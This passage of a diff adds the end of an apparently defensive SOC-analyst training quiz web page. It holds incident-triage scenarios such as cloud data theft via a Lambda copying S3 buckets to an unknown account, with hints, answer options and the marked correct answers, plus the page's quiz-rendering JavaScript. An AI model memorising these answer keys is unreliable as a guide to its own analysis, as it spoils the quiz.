+explain:`<h4>Triage Explanation</h4><p>Physical document exfiltration (T1213, T1048) via printing: DLP tools often miss printing as a data exfiltration vector. Nearly 3,000 pages of M&A and confidential client documents = significant data breach potential. Actions: DO NOT alert the paralegal; check badge records and building camera footage for midnight office presence; check remote access logs for the workstation; preserve print job logs; contact Legal and HR immediately; review print server logs for previous overnight print spikes; review which files were accessed by this account in the last 30 days.</p><p><strong>Priority: HIGH — potential physical document exfiltration, Legal/HR required.</strong></p>`},
+
+{id:"T50",title:"The Cloud Storage Data Bomb",mitre:"T1537 / T1485",
+scenario:`AWS GuardDuty alerts: a Lambda function named 'data-cleanup-prod' executed at 3:07 AM and began copying all data from 22 S3 buckets to an external S3 bucket in a different AWS account (account ID: 333444555666). The Lambda was triggered by an SNS topic. The external account has never been seen before in your CloudTrail logs. After copying 847 GB, the Lambda then began deleting the source objects.`,
+hint1:"A Lambda is copying 847 GB from your S3 buckets to an unknown external AWS account and then deleting the source data. What is the combined effect of copy-then-delete on your organization's data?",
+hint2:"Copy to attacker-controlled account + delete from your account = data theft AND destruction simultaneously. Even if you stop it partway, the attacker already has a copy of everything successfully transferred. Check the Lambda's IAM role — what permissions does it have?",
+options:["An automated backup Lambda copying data to a disaster recovery AWS account","Double-impact attack: data exfiltrated to an attacker's AWS account while simultaneously being deleted from yours","An AWS cost optimization Lambda archiving cold data to a cheaper storage tier in another account","A developer accidentally running a data migration script against production"],
+correct:1,
+explain:`<h4>Triage Explanation</h4><p>Cloud data theft + destruction (T1537, T1485): simultaneous exfiltration and deletion. This is a catastrophic cloud incident. Actions: IMMEDIATELY disable the Lambda function; identify and revoke the Lambda's IAM role; check S3 versioning on source buckets — versioned objects can be restored; contact AWS Support for emergency assistance recovering deleted objects (very short window); determine how the attacker triggered the SNS topic (compromised credentials? Lambda code injection?); assess the 847 GB of exfiltrated data for sensitivity; this is a major data breach notification event — engage Legal and breach counsel.</p><p><strong>Priority: CRITICAL — active data theft and destruction. Every second counts.</strong></p>`}
+];
+</script>
+<script>
+// ═══════════════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════════════
+let state = {
+  answers: {},   // id -> index or null
+  hints: {},     // id -> 0,1,2
+  currentTab: 'home',
+  currentHost: 0,
+  currentNet: 0,
+  currentTriage: 0,
+  correct: 0,
+  total: 0
+};
+
+// ═══════════════════════════════════════════════════
+//  HELPERS
+// ═══════════════════════════════════════════════════
+function letters(i) { return ['A','B','C','D'][i]; }
+
+function updateScore() {
+  let correct = 0, total = 0;
+  const allQ = [...hostQ, ...netQ, ...triageQ];
+  allQ.forEach(q => {
+    if (state.answers[q.id] !== undefined) {
+      total++;
+      if (state.answers[q.id] === q.correct) correct++;
+    }
+  });
+  state.correct = correct;
+  state.total = total;
+  document.getElementById('score-display').textContent = `Score: ${correct} / ${total}`;
+  const pct = total > 0 ? Math.round(correct/total*100) : 0;
+  const el = document.getElementById('home-score');
+  if (el) el.textContent = pct + '%';
+}
+
+function updateProgress(tab, idx, total) {
+  const pct = total > 0 ? Math.round((idx/total)*100) : 0;
+  const el = document.getElementById(tab + '-progress');
+  if (el) el.style.width = pct + '%';
+}
+
+// ═══════════════════════════════════════════════════
+//  SIDEBAR
+// ═══════════════════════════════════════════════════
+function buildSidebar() {
+  buildSidebarSection('sidebar-host', hostQ, 'host');
+  buildSidebarSection('sidebar-net', netQ, 'net');
+  buildSidebarSection('sidebar-triage', triageQ, 'triage');
+}
+
+function buildSidebarSection(containerId, questions, tab) {
+  const ul = document.getElementById(containerId);
+  if (!ul) return;
+  ul.innerHTML = '';
+  questions.forEach((q, idx) => {
+    const li = document.createElement('li');
+    const isAnswered = state.answers[q.id] !== undefined;
+    const isCurrent = (tab === 'host' && state.currentHost === idx) ||
+                      (tab === 'net' && state.currentNet === idx) ||
+                      (tab === 'triage' && state.currentTriage === idx);
+    const cls = isAnswered ? 'answered' : '';
+    const activeCls = isCurrent && state.currentTab === tab ? 'active' : '';
+    li.innerHTML = `<button class="${cls} ${activeCls}" onclick="jumpTo('${tab}',${idx})">
+      <span class="dot"></span>${q.id}: ${q.title}
+    </button>`;
+    ul.appendChild(li);
+  });
+}
+
+function jumpTo(tab, idx) {
+  showTab(tab);
+  if (tab === 'host') { state.currentHost = idx; renderHost(); }
+  else if (tab === 'net') { state.currentNet = idx; renderNet(); }
+  else if (tab === 'triage') { state.currentTriage = idx; renderTriage(); }
+  buildSidebar();
+}
+
+// ═══════════════════════════════════════════════════
+//  TAB SWITCHING
+// ═══════════════════════════════════════════════════
+function showTab(tab) {
+  state.currentTab = tab;
+  ['home','host','net','triage'].forEach(t => {
+    document.getElementById('view-' + t).classList.toggle('hidden', t !== tab);
+    document.getElementById('tab-' + t).classList.toggle('active', t === tab);
+  });
+  if (tab === 'host') { renderHost(); updateProgress('host', state.currentHost, hostQ.length); }
+  if (tab === 'net')  { renderNet();  updateProgress('net', state.currentNet, netQ.length); }
+  if (tab === 'triage') { renderTriage(); updateProgress('triage', state.currentTriage, triageQ.length); }
+  buildSidebar();
+}
+
+// ═══════════════════════════════════════════════════
+//  RENDER QUESTION
+// ═══════════════════════════════════════════════════
+function renderQ(q, areaId, tab, idx, total, typeLabel, typeClass) {
+  const area = document.getElementById(areaId);
+  if (!area) return;
+  const answered = state.answers[q.id] !== undefined;
+  const hintLevel = state.hints[q.id] || 0;
+  const isScenario = q.scenario !== undefined;
+
+  let html = `<div class="q-card">
+    <div class="q-meta">
+      <span class="q-num">${idx+1} / ${total}</span>
+      <span class="tag ${typeClass}">${typeLabel}</span>
+      <span class="tag tag-mitre">${q.mitre}</span>
+      <span class="tag tag-diff">${q.diff || 'Medium'}</span>
+    </div>
+    <div class="q-title">${q.title}</div>`;
+
+  if (isScenario) {
+    html += `<div class="scenario-banner"><strong>SCENARIO:</strong> ${q.scenario}</div>`;
+  } else if (q.log) {
+    html += `<div class="log-block"><div class="log-label">Log Evidence</div><pre>${q.log}</pre></div>`;
+  }
+
+  const hasTwoHints = !!q.hint2;
+  html += `<div class="hint-row">
+    <button class="hint-btn" id="hint1-${q.id}" onclick="showHint('${q.id}',1)"
+      ${hintLevel >= 1 ? 'disabled' : ''}>${hasTwoHints ? '💡 Hint 1' : '💡 MITRE Hint'}</button>
+    ${hasTwoHints ? `<button class="hint-btn" id="hint2-${q.id}" onclick="showHint('${q.id}',2)"
+      ${hintLevel >= 2 ? 'disabled' : ''}>💡 Hint 2</button>` : ''}
+  </div>
+  <div id="hints-${q.id}">`;
+
+  if (hintLevel >= 1) html += `<div class="hint-box">🔍 ${hasTwoHints ? '<strong>Hint 1:</strong> ' : ''}${q.hint1}</div>`;
+  if (hintLevel >= 2 && hasTwoHints) html += `<div class="hint-box">🔍 <strong>Hint 2:</strong> ${q.hint2}</div>`;
+  html += `</div>`;
+
+  html += `<div class="options">`;
+  q.options.forEach((opt, i) => {
+    let cls = '';
+    if (answered) {
+      if (i === q.correct) cls = 'correct';
+      else if (state.answers[q.id] === i) cls = 'wrong';
+    }
+    html += `<button class="option-btn ${cls}" ${answered ? 'disabled' : ''}
+      onclick="answer('${q.id}', ${i}, '${tab}')">
+      <span class="opt-letter">${letters(i)}.</span>${opt}
+    </button>`;
+  });
+  html += `</div>`;
+
+  if (answered) {
+    html += `<div class="explain-box">${q.explain}</div>`;
+  }
+
+  // Nav
+  html += `<div class="q-nav">`;
+  if (idx > 0) html += `<button class="nav-btn" onclick="nav('${tab}',-1)">← Previous</button>`;
+  if (idx < total - 1) html += `<button class="nav-btn primary" onclick="nav('${tab}',1)">Next →</button>`;
+  html += `<span style="margin-left:auto;font-size:.7rem;color:var(--muted)">${idx+1} of ${total}</span>`;
+  html += `</div></div>`;
+
+  area.innerHTML = html;
+}
+
+function renderHost() {
+  const q = hostQ[state.currentHost];
+  renderQ(q, 'host-question-area', 'host', state.currentHost, hostQ.length, 'Host Analysis', 'tag-host');
+  updateProgress('host', state.currentHost, hostQ.length);
+}
+
+function renderNet() {
+  const q = netQ[state.currentNet];
+  renderQ(q, 'net-question-area', 'net', state.currentNet, netQ.length, 'Network Analysis', 'tag-net');
+  updateProgress('net', state.currentNet, netQ.length);
+}
+
+function renderTriage() {
+  const q = triageQ[state.currentTriage];
+  renderQ(q, 'triage-question-area', 'triage', state.currentTriage, triageQ.length, 'Triage Scenario', 'tag-triage');
+  updateProgress('triage', state.currentTriage, triageQ.length);
+}
+
+// ═══════════════════════════════════════════════════
+//  INTERACTIONS
+// ═══════════════════════════════════════════════════
+function showHint(qid, level) {
+  if (!state.hints[qid] || state.hints[qid] < level) {
+    state.hints[qid] = level;
+  }
+  // Find which set this Q belongs to
+  const allQ = [...hostQ, ...netQ, ...triageQ];
+  const q = allQ.find(x => x.id === qid);
+  if (!q) return;
+
+  const hintsDiv = document.getElementById('hints-' + qid);
+  if (!hintsDiv) return;
+  const hasTwoHints = !!q.hint2;
+  let html = '';
+  if (state.hints[qid] >= 1) html += `<div class="hint-box">🔍 ${hasTwoHints ? '<strong>Hint 1:</strong> ' : ''}${q.hint1}</div>`;
+  if (state.hints[qid] >= 2 && hasTwoHints) html += `<div class="hint-box">🔍 <strong>Hint 2:</strong> ${q.hint2}</div>`;
+  hintsDiv.innerHTML = html;
+
+  const h1 = document.getElementById('hint1-' + qid);
+  const h2 = document.getElementById('hint2-' + qid);
+  if (h1 && state.hints[qid] >= 1) h1.disabled = true;
+  if (h2 && state.hints[qid] >= 2) h2.disabled = true;
+}
+
+function answer(qid, selectedIdx, tab) {
+  state.answers[qid] = selectedIdx;
+  updateScore();
+  buildSidebar();
+  if (tab === 'host') renderHost();
+  else if (tab === 'net') renderNet();
+  else if (tab === 'triage') renderTriage();
+}
+
+function nav(tab, dir) {
+  if (tab === 'host') {
+    state.currentHost = Math.max(0, Math.min(hostQ.length - 1, state.currentHost + dir));
+    renderHost();
+  } else if (tab === 'net') {
+    state.currentNet = Math.max(0, Math.min(netQ.length - 1, state.currentNet + dir));
+    renderNet();
+  } else if (tab === 'triage') {
+    state.currentTriage = Math.max(0, Math.min(triageQ.length - 1, state.currentTriage + dir));
+    renderTriage();
+  }
+  buildSidebar();
+  window.scrollTo(0, 0);
+}
+
+// ═══════════════════════════════════════════════════
+//  INIT
+// ═══════════════════════════════════════════════════
+document.addEventListener('DOMContentLoaded', () => {
+  buildSidebar();
+  updateScore();
+});
+</script>
+</body>
+</html>
